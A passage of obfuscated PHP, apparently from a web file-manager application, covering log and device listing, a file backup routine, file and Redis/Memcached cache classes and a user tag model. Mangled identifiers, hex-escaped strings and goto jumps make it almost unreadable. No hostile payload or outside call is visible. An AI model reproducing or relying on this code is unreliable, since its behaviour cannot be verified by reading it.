$≥ü˝¿ôÅ[$ú⁄—‘πñ[534]][$ú⁄—‘πñ[1238]]; } if ($≥ü˝¿ôÅ[$ú⁄—‘πñ[33]] == $ú⁄—‘πñ[2207]) { $ÿ»˙ËÏ≥[] = $≥ü˝¿ôÅ[$ú⁄—‘πñ[534]][$ú⁄—‘πñ[193]]; } } if (!$ÿ»˙ËÏ≥) { return array(); } return Model($ú⁄—‘πñ[897])->sourceListInfo($ÿ»˙ËÏ≥, !0); } private function logList($È∏ŒÇ—™) { $˚»°…ñÌ =& $_SERVER[ß⁄ˆÇ†Œ]; $í¬Ó˚∏” = array_to_keyvalue($È∏ŒÇ—™, $˚»°…ñÌ[12], $˚»°…ñÌ[1764]); $•∞ƒÓÇô = Model($˚»°…ñÌ[606])->userListInfo(array_unique($í¬Ó˚∏”)); $Ö†∆óıî = $this->getSourceList($È∏ŒÇ—™); $Ê“¨Ï≥± = $this->typeAll(); $¶”Œ≤„ç = array(); $‚™ø†úŒ = array(); foreach ($È∏ŒÇ—™ as $¶÷ÆÕ¯ => $êúË»ëÎ) { $„ΩµÒ›Û = $êúË»ëÎ[$˚»°…ñÌ[33]]; $Ùß§àëº = isset($•∞ƒÓÇô[$êúË»ëÎ[$˚»°…ñÌ[1764]]]) ? $•∞ƒÓÇô[$êúË»ëÎ[$˚»°…ñÌ[1764]]] : !1; $¿ô„Ω¯‚ = strpos($„ΩµÒ›Û, $˚»°…ñÌ[2422]) === 0 ? LNG($˚»°…ñÌ[2423]) : LNG($˚»°…ñÌ[2418]); $êúË»ëÎ[$˚»°…ñÌ[32]] = isset($Ùß§àëº[$˚»°…ñÌ[32]]) ? $Ùß§àëº[$˚»°…ñÌ[32]] : LNG($˚»°…ñÌ[2418]); $êúË»ëÎ[$˚»°…ñÌ[2251]] = isset($Ùß§àëº[$˚»°…ñÌ[2251]]) ? $Ùß§àëº[$˚»°…ñÌ[2251]] : $˚»°…ñÌ[12]; $êúË»ëÎ[$˚»°…ñÌ[1653]] = isset($Ê“¨Ï≥±[$„ΩµÒ›Û]) ? $Ê“¨Ï≥±[$„ΩµÒ›Û] : $¿ô„Ω¯‚; $êúË»ëÎ[$˚»°…ñÌ[2139]] = $Ùß§àëº; $ôíá¯‰— = json_decode($êúË»ëÎ[$˚»°…ñÌ[534]], !0); $êúË»ëÎ[$˚»°…ñÌ[2415]] = isset($ôíá¯‰—[$˚»°…ñÌ[2415]]) ? $ôíá¯‰—[$˚»°…ñÌ[2415]] : $˚»°…ñÌ[12]; $êúË»ëÎ[$˚»°…ñÌ[2419]] = IpLocation::get($êúË»ëÎ[$˚»°…ñÌ[2415]]); if (strpos($„ΩµÒ›Û, $˚»°…ñÌ[2198]) === 0 || isset($ôíá¯‰—[$˚»°…ñÌ[2196]])) { $ôíá¯‰—[$˚»°…ñÌ[90]] = $Ö†∆óıî[$ôíá¯‰—[$˚»°…ñÌ[193]]]; $ôíá¯‰—[$˚»°…ñÌ[2212]] = $Ö†∆óıî[$ôíá¯‰—[$˚»°…ñÌ[2196]]]; if ($ôíá¯‰—[$˚»°…ñÌ[33]] == $˚»°…ñÌ[628]) { $ôíá¯‰—[$˚»°…ñÌ[534]][$˚»°…ñÌ[1237]] = $Ö†∆óıî[$ôíá¯‰—[$˚»°…ñÌ[534]][$˚»°…ñÌ[1237]]]; $ôíá¯‰—[$˚»°…ñÌ[534]][$˚»°…ñÌ[1238]] = $Ö†∆óıî[$ôíá¯‰—[$˚»°…ñÌ[534]][$˚»°…ñÌ[1238]]]; } if ($ôíá¯‰—[$˚»°…ñÌ[33]] == $˚»°…ñÌ[2207]) { $ôíá¯‰—[$˚»°…ñÌ[534]][$˚»°…ñÌ[193]] = $Ö†∆óıî[$ôíá¯‰—[$˚»°…ñÌ[534]][$˚»°…ñÌ[193]]]; } if ($ôíá¯‰—[$˚»°…ñÌ[33]] == $˚»°…ñÌ[1931]) { $ôíá¯‰—[$˚»°…ñÌ[2212]] = $ôíá¯‰—[$˚»°…ñÌ[90]]; $ôíá¯‰—[$˚»°…ñÌ[2196]] = $ôíá¯‰—[$˚»°…ñÌ[2212]][$˚»°…ñÌ[193]]; $ôíá¯‰—[$˚»°…ñÌ[90]] = !1; $ôíá¯‰—[$˚»°…ñÌ[193]] = $˚»°…ñÌ[12]; } $ÊÎ¢˘µó = array($˚»°…ñÌ[1931], $˚»°…ñÌ[2194]); if (!in_array($ôíá¯‰—[$˚»°…ñÌ[33]], $ÊÎ¢˘µó)) { if ($ôíá¯‰—[$˚»°…ñÌ[90]] && $ôíá¯‰—[$˚»°…ñÌ[90]][$˚»°…ñÌ[190]] == $˚»°…ñÌ[191]) { $‚™ø†úŒ[] = $êúË»ëÎ[$˚»°…ñÌ[483]]; unset($È∏ŒÇ—™[$¶÷ÆÕ¯]); continue; } if ($ôíá¯‰—[$˚»°…ñÌ[2212]] && $ôíá¯‰—[$˚»°…ñÌ[2212]][$˚»°…ñÌ[190]] == $˚»°…ñÌ[191]) { $‚™ø†úŒ[] = $êúË»ëÎ[$˚»°…ñÌ[483]]; unset($È∏ŒÇ—™[$¶÷ÆÕ¯]); continue; } } } $êúË»ëÎ[$˚»°…ñÌ[534]] = $ôíá¯‰—; unset($êúË»ëÎ[$˚»°…ñÌ[2424]]); $¶”Œ≤„ç[] = $êúË»ëÎ; } $this->clearSystemPathLog($‚™ø†úŒ); return $¶”Œ≤„ç; } private function clearSystemPathLog($≈à¶ëêŒ) { $ÿ¶Á”” =& $_SERVER[ß⁄ˆÇ†Œ]; if (count($≈à¶ëêŒ) == 0) { return; } $æºàÍªä = array($ÿ¶Á””[483] => array($ÿ¶Á””[7], array_unique($≈à¶ëêŒ))); $this->where($æºàÍªä)->delete(); } public function deviceList($ö¿”™œå, $∆ÙÔ˜≈Ò = 0) { $£¡ﬁ‡⁄˚ =& $_SERVER[ß⁄ˆÇ†Œ]; $†Ï«Â«” = array($£¡ﬁ‡⁄˚[1764] => $ö¿”™œå, $£¡ﬁ‡⁄˚[231] => array($£¡ﬁ‡⁄˚[1088], $∆ÙÔ˜≈Ò), $£¡ﬁ‡⁄˚[33] => $£¡ﬁ‡⁄˚[1905]); $µæ±∂ƒ™ = array(); $Ë›‡¿Ã¡ = $this->field($£¡ﬁ‡⁄˚[2425])->where($†Ï«Â«”)->order($£¡ﬁ‡⁄˚[2210])->limit(50)->select(); foreach ($Ë›‡¿Ã¡ as $√ö◊∞¬ﬁ => $¿ø√¶…Í) { if ($√ö◊∞¬ﬁ > 0 && abs($¿ø√¶…Í[$£¡ﬁ‡⁄˚[231]] - $Ë›‡¿Ã¡[$√ö◊∞¬ﬁ - 1][$£¡ﬁ‡⁄˚[231]]) < 5) { continue; } $†ù“∫Ω¡ = json_decode($¿ø√¶…Í[$£¡ﬁ‡⁄˚[534]], !0); $¿ø√¶…Í[$£¡ﬁ‡⁄˚[2415]] = isset($†ù“∫Ω¡[$£¡ﬁ‡⁄˚[2415]]) ? $†ù“∫Ω¡[$£¡ﬁ‡⁄˚[2415]] : $£¡ﬁ‡⁄˚[12]; unset($†ù“∫Ω¡[$£¡ﬁ‡⁄˚[2415]]); $«ÕŒØ§ﬁ = $this->deviceType($†ù“∫Ω¡[$£¡ﬁ‡⁄˚[2199]]); if (isset($µæ±∂ƒ™[$«ÕŒØ§ﬁ])) { continue; } $¿ø√¶…Í[$£¡ﬁ‡⁄˚[2419]] = IpLocation::get($¿ø√¶…Í[$£¡ﬁ‡⁄˚[2415]]); $¿ø√¶…Í[$£¡ﬁ‡⁄˚[534]] = $†ù“∫Ω¡; $µæ±∂ƒ™[$«ÕŒØ§ﬁ] = $¿ø√¶…Í; } return array_values($µæ±∂ƒ™); } public function deviceType($ÚÊ±°å) { return $ÚÊ±°å; } } goto a£Ñ∑ó‡á’; eî‰‡ä‡„: class BackupFile { public function __construct() { } public function index() { $≥¡Áû›µ = Backup::get(); $ï„¢‚Ìª = $≥¡Áû›µ[$_SERVER[ß⁄ˆÇ†Œ][378]][$_SERVER[ß⁄ˆÇ†Œ][230]][$_SERVER[ß⁄ˆÇ†Œ][549]]; $®ﬁ˚√î˝ = array($_SERVER[ß⁄ˆÇ†Œ][550] => array($_SERVER[ß⁄ˆÇ†Œ][880], $ï„¢‚Ìª), $_SERVER[ß⁄ˆÇ†Œ][881] => array($_SERVER[ß⁄ˆÇ†Œ][416], $≥¡Áû›µ[$_SERVER[ß⁄ˆÇ†Œ][825]])); $≥™áùƒÖ = (int) Model($_SERVER[ß⁄ˆÇ†Œ][862])->where($®ﬁ˚√î˝)->count($_SERVER[ß⁄ˆÇ†Œ][549]); $– ˝¬µ® = (int) Model($_SERVER[ß⁄ˆÇ†Œ][862])->where($®ﬁ˚√î˝)->sum($_SERVER[ß⁄ˆÇ†Œ][79]); $ÑÇÑ®…õ = new TaskFileTransfer($_SERVER[ß⁄ˆÇ†Œ][882], $_SERVER[ß⁄ˆÇ†Œ][856], $≥™áùƒÖ, LNG($_SERVER[ß⁄ˆÇ†Œ][857]) . $_SERVER[ß⁄ˆÇ†Œ][858] . LNG($_SERVER[ß⁄ˆÇ†Œ][883])); $ÑÇÑ®…õ->task[$_SERVER[ß⁄ˆÇ†Œ][836]] = $– ˝¬µ®; $≠Å±úµ∏ = array($_SERVER[ß⁄ˆÇ†Œ][884] => $≥™áùƒÖ, $_SERVER[ß⁄ˆÇ†Œ][885] => $– ˝¬µ®, $_SERVER[ß⁄ˆÇ†Œ][886] => time()); Backup::set($≠Å±úµ∏); $Ó˙ò—˜Ü = !0; $∂»˚å¿É = $this->storeIds(); $Ωˆﬂ«±Õ = 1; $Ñå Û¬û = 1000; $ı≤ŒŸöã = $Ä¶ﬁú´Ù = 0; $À–˛À∏ì = array(); $ﬂ√ï˚ˆõ = $Ú≥úÃ¢∫ = 0; do { $Ùå™—™• = $_SERVER[ß⁄ˆÇ†Œ][887]; $ø…’€Ùπ = Model($_SERVER[ß⁄ˆÇ†Œ][862])->where($®ﬁ˚√î˝)->field($Ùå™—™•)->order($_SERVER[ß⁄ˆÇ†Œ][888])->selectPage($Ñå Û¬û, $Ωˆﬂ«±Õ); $ÀêÍâΩä = !empty($ø…’€Ùπ[$_SERVER[ß⁄ˆÇ†Œ][454]]) ? $ø…’€Ùπ[$_SERVER[ß⁄ˆÇ†Œ][454]] : array(); foreach ($ÀêÍâΩä as $€•Ö∂∫ø) { if (!$this->_fileExist($€•Ö∂∫ø, $À–˛À∏ì, $∂»˚å¿É)) { write_log("\146\151\x6c\x65\x20\x6e\157\x74\40\x65\x78\151\163\x74\x2e\146\x69\x6c\x65\x49\x44\x3a{$€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][549]]}\x2c\x20\x70\x61\164\150\x3a{$€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][87]]}", $_SERVER[ß⁄ˆÇ†Œ][889]); continue; } $¨ﬁ˚˚πƒ = $€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][87]]; $¶ÉîﬂÒü = "\173\151\157\72{$≥¡Áû›µ[$_SERVER[ß⁄ˆÇ†Œ][825]]}\175" . substr($¨ﬁ˚˚πƒ, strlen("\x7b\x69\157\x3a{$€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][890]]}\x7d")); if (IO::exist($¶ÉîﬂÒü)) { $ÑÇÑ®…õ->updateFileEnd($€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][32]], $€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][79]]); } else { $¶ÉîﬂÒü = get_path_father($¶ÉîﬂÒü); IO::mkdir($¶ÉîﬂÒü); if (!IO::copy($¨ﬁ˚˚πƒ, $¶ÉîﬂÒü, $_SERVER[ß⁄ˆÇ†Œ][891])) { write_log($_SERVER[ß⁄ˆÇ†Œ][892] . $¨ﬁ˚˚πƒ . $_SERVER[ß⁄ˆÇ†Œ][876] . $¶ÉîﬂÒü . $_SERVER[ß⁄ˆÇ†Œ][178], $_SERVER[ß⁄ˆÇ†Œ][856]); $Ó˙ò—˜Ü = !1; break; } } $ï„¢‚Ìª = $€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][549]]; $Ä¶ﬁú´Ù += 1; $ı≤ŒŸöã += $€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][79]]; $Ú≥úÃ¢∫ += 1; $ﬂ√ï˚ˆõ += $€•Ö∂∫ø[$_SERVER[ß⁄ˆÇ†Œ][79]]; if ($ı≤ŒŸöã >= 1024 * 1024 * 100) { $≠Å±úµ∏ = array($_SERVER[ß⁄ˆÇ†Œ][824] => $ï„¢‚Ìª, $_SERVER[ß⁄ˆÇ†Œ][893] => $Ú≥úÃ¢∫, $_SERVER[ß⁄ˆÇ†Œ][894] => $ﬂ√ï˚ˆõ); Backup::set($≠Å±úµ∏); $ı≤ŒŸöã = $Ä¶ﬁú´Ù = 0; } } $∏ˆ Ñ∂Ò = count($ÀêÍâΩä); $Ωˆﬂ«±Õ++; } while ($∏ˆ Ñ∂Ò == $Ñå Û¬û); $ÑÇÑ®…õ->end(); $≠Å±úµ∏ = array($_SERVER[ß⁄ˆÇ†Œ][895] => 1, $_SERVER[ß⁄ˆÇ†Œ][834] => time(), $_SERVER[ß⁄ˆÇ†Œ][848] => 1, $_SERVER[ß⁄ˆÇ†Œ][824] => $ï„¢‚Ìª, $_SERVER[ß⁄ˆÇ†Œ][896] => time()); if ($Ä¶ﬁú´Ù) { $≠Å±úµ∏[$_SERVER[ß⁄ˆÇ†Œ][893]] = $Ú≥úÃ¢∫; $≠Å±úµ∏[$_SERVER[ß⁄ˆÇ†Œ][894]] = $ﬂ√ï˚ˆõ; } Backup::set($≠Å±úµ∏); return !0; } private function _fileExist($¥≥æÀÈí, &$„é–¶ªÉ, $¬≈◊¿≥ò) { $’ü™¢≈è =& $_SERVER[ß⁄ˆÇ†Œ]; $ëˆÿ»‰ç = $¥≥æÀÈí[$’ü™¢≈è[87]]; if (in_array($¥≥æÀÈí[$’ü™¢≈è[549]], $„é–¶ªÉ)) { return !1; } if (!in_array($¥≥æÀÈí[$’ü™¢≈è[890]], $¬≈◊¿≥ò)) { return !1; } if (IO::exist($ëˆÿ»‰ç)) { return !0; } $ß—π≠ùÈ = get_path_father($ëˆÿ»‰ç); if (IO::exist($ß—π≠ùÈ)) { $„é–¶ªÉ[] = $¥≥æÀÈí[$’ü™¢≈è[549]]; return !1; } $˙‚Ç◊Ê± = array($’ü™¢≈è[890] => $¥≥æÀÈí[$’ü™¢≈è[890]], $’ü™¢≈è[87] => array($’ü™¢≈è[467], "{$ß—π≠ùÈ}\45")); $îπ€ºƒ” = Model($’ü™¢≈è[862])->where($˙‚Ç◊Ê±)->field($’ü™¢≈è[550])->select(); $„é–¶ªÉ = array_merge($„é–¶ªÉ, array_to_keyvalue($îπ€ºƒ”, $’ü™¢≈è[12], $’ü™¢≈è[549])); return !1; } private function _fileFilter($Ä≥ªñé∑) { $ùﬁÊüÃÿ =& $_SERVER[ß⁄ˆÇ†Œ]; return; if (empty($Ä≥ªñé∑)) { return; } $º¬  ◊√ = array($ùﬁÊüÃÿ[549] => array($ùﬁÊüÃÿ[7], array_unique($Ä≥ªñé∑))); $Õì≠≥⁄¯ = Model($ùﬁÊüÃÿ[897])->where($º¬  ◊√)->field($ùﬁÊüÃÿ[193])->select(); foreach ($Õì≠≥⁄¯ as $√◊‚Ó⁄ç) { Model($ùﬁÊüÃÿ[897])->remove($√◊‚Ó⁄ç[$ùﬁÊüÃÿ[193]], !1); } } private function storeIds() { $›õå¥Ù≈ =& $_SERVER[ß⁄ˆÇ†Œ]; $Î’ì´›Û = Model($›õå¥Ù≈[840])->listData(); $ÚÂ¡∞ñÆ = array(); $ä®˛•Åê = $GLOBALS[$›õå¥Ù≈[6]][$›õå¥Ù≈[92]][$›õå¥Ù≈[898]]; foreach ($Î’ì´›Û as $åë„‰˚¨) { $˜ΩÑ⁄˚Æ = strtolower($åë„‰˚¨[$›õå¥Ù≈[98]]); if (!isset($ä®˛•Åê[$˜ΩÑ⁄˚Æ])) { continue; } $∆ì≤Åä£ = $›õå¥Ù≈[77] . (isset($ä®˛•Åê[$˜ΩÑ⁄˚Æ]) ? $ä®˛•Åê[$˜ΩÑ⁄˚Æ] : ucfirst($˜ΩÑ⁄˚Æ)); if (!class_exists($∆ì≤Åä£)) { continue; } $ÚÂ¡∞ñÆ[] = $åë„‰˚¨[$›õå¥Ù≈[483]]; } return $ÚÂ¡∞ñÆ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $‰√ê∫Œˆ =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $»√Ì¸ÿ  = $GLOBALS[$‰√ê∫Œˆ[6]][$‰√ê∫Œˆ[434]]; $¢üﬂà◊« = $»√Ì¸ÿ [$»√Ì¸ÿ [$‰√ê∫Œˆ[899]]]; $¢∆πØçˆ = $»√Ì¸ÿ [$‰√ê∫Œˆ[900]]; switch ($»√Ì¸ÿ [$‰√ê∫Œˆ[899]]) { case $‰√ê∫Œˆ[21]: self::$handle = Model($‰√ê∫Œˆ[901]); break; case $‰√ê∫Œˆ[902]: self::$handle = new CacheRedis($¢üﬂà◊«, $¢∆πØçˆ); break; case $‰√ê∫Œˆ[903]: self::$handle = new CacheMemcached($¢üﬂà◊«, $¢∆πØçˆ); break; case $‰√ê∫Œˆ[230]: self::$handle = new CacheFile($¢üﬂà◊«, $¢∆πØçˆ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ÃµÒ˜÷È) { if (is_array($ÃµÒ˜÷È) || is_object($ÃµÒ˜÷È)) { $ÃµÒ˜÷È = json_encode($ÃµÒ˜÷È); } $ÃµÒ˜÷È = rawurlencode($ÃµÒ˜÷È); return md5(KOD_SITE_ID . $_SERVER[ß⁄ˆÇ†Œ][11] . $ÃµÒ˜÷È); } public static function get($∏™ªÇ˙ã, $óÈ°Úàô = false) { $ë Ù€ÆÈ = self::key($∏™ªÇ˙ã); $Ù‹íñêâ = self::init(); if ($óÈ°Úàô) { return unserialize($Ù‹íñêâ->get($ë Ù€ÆÈ)); } if (!isset(self::$memoryCache[$ë Ù€ÆÈ])) { $›…ì‹¡Õ = $Ù‹íñêâ->get($ë Ù€ÆÈ); self::$memoryCache[$ë Ù€ÆÈ] = unserialize($›…ì‹¡Õ); } return self::$memoryCache[$ë Ù€ÆÈ]; } public static function set($ü–êøôƒ, $£–÷ÿîá, $ÉóÁ¡Û¨ = false) { $≈∆§®¶˘ =& $_SERVER[ß⁄ˆÇ†Œ]; $¿ﬂ≈Ùÿ” = self::key($ü–êøôƒ); if (isset(self::$memoryCache[$¿ﬂ≈Ùÿ”]) && self::$memoryCache[$¿ﬂ≈Ùÿ”] === $£–÷ÿîá) { return !0; } if ($ÉóÁ¡Û¨ === 0) { self::$memoryCache[$¿ﬂ≈Ùÿ”] = $£–÷ÿîá; return !0; } $÷Ô¿ò£å = self::init(); $ôñ‚ÆåÉ = serialize($£–÷ÿîá); CacheLock::lock($ü–êøôƒ . $≈∆§®¶˘[904]); $ãÃ≤Ê†Ú = $÷Ô¿ò£å->set($¿ﬂ≈Ùÿ”, $ôñ‚ÆåÉ, $ÉóÁ¡Û¨); self::$memoryCache[$¿ﬂ≈Ùÿ”] = $£–÷ÿîá; CacheLock::unlock($ü–êøôƒ . $≈∆§®¶˘[904]); return $ãÃ≤Ê†Ú; } public static function getCall($âÀ⁄≈õ˘, $µÄ¨‡≥, $Õµ√¸Ô¨, $∂‘Ö√ˆ… = array()) { $Ô´æï¢ =& $_SERVER[ß⁄ˆÇ†Œ]; $Í¢„∞£… = self::get($âÀ⁄≈õ˘); if ($Í¢„∞£… || $Í¢„∞£… === $Ô´æï¢[12]) { return $Í¢„∞£…; } $Í¢„∞£… = call_user_func_array($Õµ√¸Ô¨, $∂‘Ö√ˆ…); $Í¢„∞£… = $Í¢„∞£… ? $Í¢„∞£… : $Ô´æï¢[12]; self::set($âÀ⁄≈õ˘, $Í¢„∞£…, $µÄ¨‡≥); return $Í¢„∞£…; } public static function remove($ÅŸ†¨éŸ) { $ƒ˙ÍüêÓ = self::key($ÅŸ†¨éŸ); unset(self::$memoryCache[$ƒ˙ÍüêÓ]); self::clearTimeout(); CacheLock::lock($ÅŸ†¨éŸ); $øäËÀ…Æ = self::init()->remove($ƒ˙ÍüêÓ); CacheLock::unlock($ÅŸ†¨éŸ); return $øäËÀ…Æ; } public static function removeMemory($†‰´¯ƒ≠) { $ï¯…àøÑ = self::key($†‰´¯ƒ≠); unset(self::$memoryCache[$ï¯…àøÑ]); } public static function clearMemory($∆Ôæ„ÿâ = false) { if ($∆Ôæ„ÿâ) { $∆Ôæ„ÿâ = self::key($∆Ôæ„ÿâ); unset(self::$memoryCache[$∆Ôæ„ÿâ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ß⁄ˆÇ†Œ][905])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ß⁄ˆÇ†Œ][906])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Úö…Óè˘, $íáÛÀÏ∏) { $ÈÀâ°ôˆ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->cachePath = $Úö…Óè˘[$ÈÀâ°ôˆ[87]]; $this->prefix = $ÈÀâ°ôˆ[907]; $this->cacheTime = $íáÛÀÏ∏; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($µÀ®Ê∑î) { $˜≤ã¡õ˙ =& $_SERVER[ß⁄ˆÇ†Œ]; $µÀ®Ê∑î = str_replace(array($˜≤ã¡õ˙[908], $˜≤ã¡õ˙[100], $˜≤ã¡õ˙[76]), $˜≤ã¡õ˙[909], $µÀ®Ê∑î); return $this->cachePath . $˜≤ã¡õ˙[910] . $µÀ®Ê∑î . $˜≤ã¡õ˙[911]; } public function set($Âµò®êì, $Öû±£◊˜, $»Ñ•î€ù = false) { $»Ñ•î€ù = $»Ñ•î€ù ? $»Ñ•î€ù : $this->cacheTime; $Ãáß°Ú£ = $this->getFile($Âµò®êì); if (file_put_contents($Ãáß°Ú£, $this->prefix . $Öû±£◊˜, LOCK_EX)) { @touch($Ãáß°Ú£, intval(time() + $»Ñ•î€ù)); clearstatcache(); return !0; } @unlink($Ãáß°Ú£); return !1; } public function get($ÊΩÒ¿é˝) { $∫‹ñÙ‹ı = $this->getFile($ÊΩÒ¿é˝); if (file_exists($∫‹ñÙ‹ı) && filemtime($∫‹ñÙ‹ı) < time()) { @unlink($∫‹ñÙ‹ı); return !1; } $§úîÛîÆ = @file_get_contents($∫‹ñÙ‹ı); return substr($§úîÛîÆ, strlen($this->prefix)); } public function remove($ÛáÄ˚º¢) { $‚ó∞›ƒ– = $this->getFile($ÛáÄ˚º¢); return @unlink($‚ó∞›ƒ–); } public function deleteAll() { $¯ËÌ÷ª∫ =& $_SERVER[ß⁄ˆÇ†Œ]; $ãÑ”ó⁄ã = scandir($this->cachePath); foreach ($ãÑ”ó⁄ã as $¥Úùõ∑À) { $Èõè˛ı‚ = $this->cachePath . $¥Úùõ∑À; if (strpos($Èõè˛ı‚, $¯ËÌ÷ª∫[911]) && strpos($Èõè˛ı‚, $¯ËÌ÷ª∫[912])) { @unlink($Èõè˛ı‚); } } } public function clearTimeout() { $õ‹¶∞ëà =& $_SERVER[ß⁄ˆÇ†Œ]; $Ö©ïë∞˜ = scandir($this->cachePath); foreach ($Ö©ïë∞˜ as $≤ﬁñÊﬁØ) { $πå±ŸÊË = $this->cachePath . $≤ﬁñÊﬁØ; if (strpos($πå±ŸÊË, $õ‹¶∞ëà[911]) && strpos($πå±ŸÊË, $õ‹¶∞ëà[912]) && filemtime($πå±ŸÊË) < time()) { @unlink($πå±ŸÊË); } } } } goto dÑ›≠èÒÃá; FûµïËøΩ•: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\164\x61\147\x4c\x69\x73\x74"; public $modelType = "\x55\x73\145\162\x4f\160\x74\151\157\156"; public $field = array("\156\141\155\145", "\x73\x74\171\154\x65", "\163\157\162\x74"); public function listData($Àå∑ª’¯ = false, $¡∞£ÕœÊ = "\x73\x6f\162\164", $⁄ë˜∫∫Œ = false) { return parent::listData($Àå∑ª’¯, $¡∞£ÕœÊ, $⁄ë˜∫∫Œ); } public function remove($Ï˙ùûËå) { return parent::remove($Ï˙ùûËå); } public function add($•˙Ω†£ˆ, $æ«ç•âÂ = "\x6c\x61\x62\x65\x6c\x2d\x67\162\145\171\x2d\x6e\x6f\x72\x6d\x61\x6c") { $¥ÛÂúåﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->findByName($•˙Ω†£ˆ)) { return !1; } $¡Çﬂç∑£ = array($¥ÛÂúåﬂ[502] => $•˙Ω†£ˆ, $¥ÛÂúåﬂ[566] => $æ«ç•âÂ, $¥ÛÂúåﬂ[1967] => $this->getSort($¥ÛÂúåﬂ[344]) + 1); return parent::insert($¡Çﬂç∑£); } public function update($‘∆¡≈Ç≥, $ÓÆòõé˛) { $√ú€Æçö =& $_SERVER[ß⁄ˆÇ†Œ]; $˜›®¶≠£ = $this->listData($‘∆¡≈Ç≥); $ùÕ‚„áè = $this->findByName($ÓÆòõé˛[$√ú€Æçö[32]]); if (!$˜›®¶≠£ || $ùÕ‚„áè && $ùÕ‚„áè[$√ú€Æçö[483]] != $˜›®¶≠£[$√ú€Æçö[483]]) { return !1; } return parent::update($‘∆¡≈Ç≥, $ÓÆòõé˛); } public function moveTop($‚Ûé˛≠Ê) { $Êé›°¨’ =& $_SERVER[ß⁄ˆÇ†Œ]; $∑®°Â√¡ = parent::listData(); $¯Ó≈Çı∂ = $this->getSort($Êé›°¨’[343]); foreach ($∑®°Â√¡ as &$àäﬂø£≈) { if ($àäﬂø£≈[$Êé›°¨’[483]] == $‚Ûé˛≠Ê) { $àäﬂø£≈[$Êé›°¨’[1987]] = $¯Ó≈Çı∂; continue; } $àäﬂø£≈[$Êé›°¨’[1987]] += 1; } unset($àäﬂø£≈); return parent::resetData($∑®°Â√¡); } public function moveBottom($‚Ö«¸É‚) { $´¥ç… æ =& $_SERVER[ß⁄ˆÇ†Œ]; $¿Åºı≠ê = $this->getSort($´¥ç… æ[344]) + 1; return parent::update($‚Ö«¸É‚, array($´¥ç… æ[1987] => $¿Åºı≠ê)); } public function resetSort($—»¢ÍÀ’) { $ìÁÚ¢øØ =& $_SERVER[ß⁄ˆÇ†Œ]; $˜öÔŸ∂Ø = array(); $—»¢ÍÀ’ = is_array($—»¢ÍÀ’) ? $—»¢ÍÀ’ : array(); for ($º∞˛‚´≠ = 0; $º∞˛‚´≠ < count($—»¢ÍÀ’); $º∞˛‚´≠++) { $˜öÔŸ∂Ø[$—»¢ÍÀ’[$º∞˛‚´≠] . $ìÁÚ¢øØ[12]] = $º∞˛‚´≠ + 1; } $Ç¶Œ¡å◊ = parent::listData(); foreach ($Ç¶Œ¡å◊ as &$Ïæ‰Õàë) { $·ËŸÔøÁ = $˜öÔŸ∂Ø[$Ïæ‰Õàë[$ìÁÚ¢øØ[483]]]; $Ïæ‰Õàë[$ìÁÚ¢øØ[1987]] = $·ËŸÔøÁ ? $·ËŸÔøÁ : $Ïæ‰Õàë[$ìÁÚ¢øØ[1987]]; } unset($Ïæ‰Õàë); return parent::resetData($Ç¶Œ¡å◊); } private function getSort($¶ÆµÖƒâ) { $Ë–∑π∞ê =& $_SERVER[ß⁄ˆÇ†Œ]; $«Õ‚ﬁ¢Î = parent::listData(); $¬€–°¸Ω = array_to_keyvalue($«Õ‚ﬁ¢Î, $Ë–∑π∞ê[12], $Ë–∑π∞ê[1987]); if (!$¬€–°¸Ω) { $¬€–°¸Ω = array(0); } $ô€œﬁˆ€ = $¶ÆµÖƒâ == $Ë–∑π∞ê[344] ? max($¬€–°¸Ω) : min($¬€–°¸Ω); return intval($ô€œﬁˆ€); } } goto déäΩ‹¥¨; eàãåçÛ–¬: function binCheckBigger($ﬁ˜¥©», $Ωò—Ê˜é) { return $ﬁ˜¥©» > $Ωò—Ê˜é; } $_SERVER[$_SERVER[Ú›Ë•ÓÌ][3]] = ("\70\65\60\61"."\x39\x37")+0;$_dwpq="5ur3gi2wbyzhf80tc197xpjqm4esoldvk6an8m3kgplvebtxzu7hyfs6jqrc091id24wno5aek9rcz25";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Œú∞Ê¸, $ ≠‹¥…˚) { $Ù•ˆ∑”á =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset(self::$_methodList[$Œú∞Ê¸])) { return @call_user_func_array(self::$_methodList[$Œú∞Ê¸], $ ≠‹¥…˚); } else { if (method_exists($this, $Œú∞Ê¸)) { return call_user_func_array(array($this, $Œú∞Ê¸), $ ≠‹¥…˚); } else { think_exception(__CLASS__ . $Ù•ˆ∑”á[4] . $Œú∞Ê¸ . $Ù•ˆ∑”á[5]); } } } public static function __callStatic($ÆªÂ–≤º, $Ã§›˛Ôû) { if (isset(self::$_methodListStatic[$ÆªÂ–≤º])) { return call_user_func_array(self::$_methodListStatic[$ÆªÂ–≤º], $Ã§›˛Ôû); } else { if (method_exists(self, $ÆªÂ–≤º)) { return call_user_func_array(array(self, $ÆªÂ–≤º), $Ã§›˛Ôû); } else { show_json("{$ÆªÂ–≤º}\50\51\40\156\x6f\164\x20\145\170\x69\x73\x74\x3b", !1); } } } public static function addMethod($Æ‰™∆ÍÚ, 